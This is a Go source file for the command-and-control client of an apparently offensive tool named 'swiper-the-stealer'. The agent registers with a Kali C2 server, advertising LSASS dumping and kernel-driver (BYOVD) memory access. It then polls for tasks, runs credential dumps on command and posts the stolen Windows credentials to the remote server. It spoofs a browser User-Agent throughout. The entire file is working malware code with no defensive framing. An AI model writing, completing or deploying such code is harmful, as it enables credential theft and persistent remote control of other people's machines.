package c2client

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"swiper-the-stealer/internal/config"
	"swiper-the-stealer/internal/lsass"
	"swiper-the-stealer/pkg/logger"
)

// C2Client handles communication with Kali C2 server
type C2Client struct {
	config     *config.C2Config
	httpClient *http.Client
	logger     *logger.Logger
	agentID    string
}

// C2Message represents communication protocol with C2 server
type C2Message struct {
	AgentID   string      `json:"agent_id"`
	Timestamp int64       `json:"timestamp"`
	Command   string      `json:"command"`
	Data      interface{} `json:"data,omitempty"`
	Status    string      `json:"status"`
	Error     string      `json:"error,omitempty"`
}

// CommandRequest represents incoming commands from C2 server
type CommandRequest struct {
	Command    string            `json:"command"`
	Parameters map[string]string `json:"parameters,omitempty"`
	TaskID     string            `json:"task_id"`
}

// CommandResponse represents responses sent back to C2 server
type CommandResponse struct {
	TaskID    string      `json:"task_id"`
	Command   string      `json:"command"`
	Success   bool        `json:"success"`
	Data      interface{} `json:"data,omitempty"`
	Error     string      `json:"error,omitempty"`
	Timestamp int64       `json:"timestamp"`
}

// NewC2Client creates a new C2 client instance
func NewC2Client(cfg *config.C2Config, logger *logger.Logger) *C2Client {
	return &C2Client{
		config: cfg,
		httpClient: &http.Client{
			Timeout: time.Duration(cfg.RequestTimeout) * time.Second,
		},
		logger:  logger,
		agentID: generateAgentID(),
	}
}

// generateAgentID creates unique agent identifier
func generateAgentID() string {
	// Simple agent ID generation - in practice use machine fingerprinting
	return fmt.Sprintf("rtcore-%d", time.Now().Unix())
}

// Register registers the agent with C2 server
func (c2 *C2Client) Register() error {
	c2.logger.Info("Registering with C2 server...")
	
	regData := map[string]interface{}{
		"agent_type":    "BYOVD-RTCore",
		"capabilities":  []string{"lsass_dump", "memory_read", "physical_access"},
		"os":           "Windows",
		"architecture": "x64",
	}
	
	message := C2Message{
		AgentID:   c2.agentID,
		Timestamp: time.Now().Unix(),
		Command:   "register",
		Data:      regData,
		Status:    "success",
	}
	
	response, err := c2.sendMessage(message)
	if err != nil {
		return fmt.Errorf("registration failed: %v", err)
	}
	
	c2.logger.Infof("Successfully registered with C2 server: %s", response.Status)
	return nil
}

// CheckIn performs regular check-in with C2 server for commands
func (c2 *C2Client) CheckIn() (*CommandRequest, error) {
	c2.logger.Debug("Checking in with C2 server for commands...")
	
	message := C2Message{
		AgentID:   c2.agentID,
		Timestamp: time.Now().Unix(),
		Command:   "checkin",
		Status:    "ready",
	}
	
	response, err := c2.sendMessage(message)
	if err != nil {
		return nil, fmt.Errorf("check-in failed: %v", err)
	}
	
	// Parse command from response
	if response.Data != nil {
		cmdBytes, _ := json.Marshal(response.Data)
		var cmdReq CommandRequest
		if err := json.Unmarshal(cmdBytes, &cmdReq); err == nil && cmdReq.Command != "" {
			c2.logger.Infof("Received command from C2: %s", cmdReq.Command)
			return &cmdReq, nil
		}
	}
	
	return nil, nil // No commands pending
}

// SendCredentials sends extracted credentials to C2 server
func (c2 *C2Client) SendCredentials(credentials []lsass.LSASSCredentials, taskID string) error {
	c2.logger.Infof("Sending %d credential sets to C2 server...", len(credentials))
	
	response := CommandResponse{
		TaskID:    taskID,
		Command:   "lsass_dump",
		Success:   true,
		Data:      credentials,
		Timestamp: time.Now().Unix(),
	}
	
	message := C2Message{
		AgentID:   c2.agentID,
		Timestamp: time.Now().Unix(),
		Command:   "response",
		Data:      response,
		Status:    "success",
	}
	
	_, err := c2.sendMessage(message)
	if err != nil {
		return fmt.Errorf("failed to send credentials: %v", err)
	}
	
	c2.logger.Info("Credentials successfully transmitted to C2 server")
	return nil
}

// SendError sends error information to C2 server
func (c2 *C2Client) SendError(command, taskID, errorMsg string) error {
	c2.logger.Warnf("Sending error to C2 server: %s", errorMsg)
	
	response := CommandResponse{
		TaskID:    taskID,
		Command:   command,
		Success:   false,
		Error:     errorMsg,
		Timestamp: time.Now().Unix(),
	}
	
	message := C2Message{
		AgentID:   c2.agentID,
		Timestamp: time.Now().Unix(),
		Command:   "response",
		Data:      response,
		Status:    "error",
		Error:     errorMsg,
	}
	
	_, err := c2.sendMessage(message)
	return err
}

// SendHeartbeat sends keepalive heartbeat to C2 server
func (c2 *C2Client) SendHeartbeat() error {
	c2.logger.Debug("Sending heartbeat to C2 server...")
	
	message := C2Message{
		AgentID:   c2.agentID,
		Timestamp: time.Now().Unix(),
		Command:   "heartbeat",
		Status:    "alive",
	}
	
	_, err := c2.sendMessage(message)
	if err != nil {
		c2.logger.Warnf("Heartbeat failed: %v", err)
		return err
	}
	
	return nil
}

// sendMessage sends HTTP message to C2 server
func (c2 *C2Client) sendMessage(message C2Message) (*C2Message, error) {
	// Create the payload in the format the server expects
	payload := map[string]interface{}{
		"agent_id": message.AgentID,
		"command":  message.Command,
		"data":     message.Data,
	}
	
	// Add timestamp and status if present
	if message.Status != "" {
		payload["status"] = message.Status
	}
	if message.Error != "" {
		payload["error"] = message.Error
	}
	
	// Serialize message
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to serialize message: %v", err)
	}
	
	c2.logger.Debugf("Sending message to C2 server: %s", c2.config.ServerURL+"/api/agent")
	
	// Create HTTP request
	req, err := http.NewRequest("POST", c2.config.ServerURL+"/api/agent", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}
	
	// Set headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	
	if c2.config.APIKey != "" {
		req.Header.Set("X-API-Key", c2.config.APIKey)
	}
	
	// Send request
	resp, err := c2.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("HTTP request failed: %v", err)
	}
	defer resp.Body.Close()
	
	// Read response
	responseData, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %v", err)
	}
	
	// Check status code
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("C2 server returned error: %d - %s", resp.StatusCode, string(responseData))
	}
	
	// Parse response
	var responseMessage C2Message
	if err := json.Unmarshal(responseData, &responseMessage); err != nil {
		return nil, fmt.Errorf("failed to parse response: %v", err)
	}
	
	return &responseMessage, nil
}

// StartCommandLoop starts the main command processing loop
func (c2 *C2Client) StartCommandLoop(dumpHandler func(string) error, stopChan chan bool) {
	c2.logger.Info("Starting C2 command processing loop...")
	
	heartbeatTicker := time.NewTicker(time.Duration(c2.config.HeartbeatInterval) * time.Second)
	checkinTicker := time.NewTicker(time.Duration(c2.config.CheckinInterval) * time.Second)
	
	defer heartbeatTicker.Stop()
	defer checkinTicker.Stop()
	
	for {
		select {
		case <-stopChan:
			c2.logger.Info("Stopping C2 command loop...")
			return
			
		case <-heartbeatTicker.C:
			c2.SendHeartbeat()
			
		case <-checkinTicker.C:
			cmd, err := c2.CheckIn()
			if err != nil {
				c2.logger.Warnf("Check-in failed: %v", err)
				continue
			}
			
			if cmd != nil {
				c2.logger.Infof("Processing command: %s (Task: %s)", cmd.Command, cmd.TaskID)
				
				switch cmd.Command {
				case "lsass_dump":
					if err := dumpHandler(cmd.TaskID); err != nil {
						c2.SendError(cmd.Command, cmd.TaskID, err.Error())
					}
					
				case "status":
					response := CommandResponse{
						TaskID:    cmd.TaskID,
						Command:   cmd.Command,
						Success:   true,
						Data:      map[string]string{"status": "operational", "agent_id": c2.agentID},
						Timestamp: time.Now().Unix(),
					}
					
					message := C2Message{
						AgentID:   c2.agentID,
						Timestamp: time.Now().Unix(),
						Command:   "response",
						Data:      response,
						Status:    "success",
					}
					
					c2.sendMessage(message)
					
				case "terminate":
					c2.logger.Info("Received termination command from C2 server")
					stopChan <- true
					return
					
				default:
					c2.logger.Warnf("Unknown command received: %s", cmd.Command)
					c2.SendError(cmd.Command, cmd.TaskID, "unknown command")
				}
			}
		}
	}
}

// GetAgentID returns the current agent ID
func (c2 *C2Client) GetAgentID() string {
	return c2.agentID
}
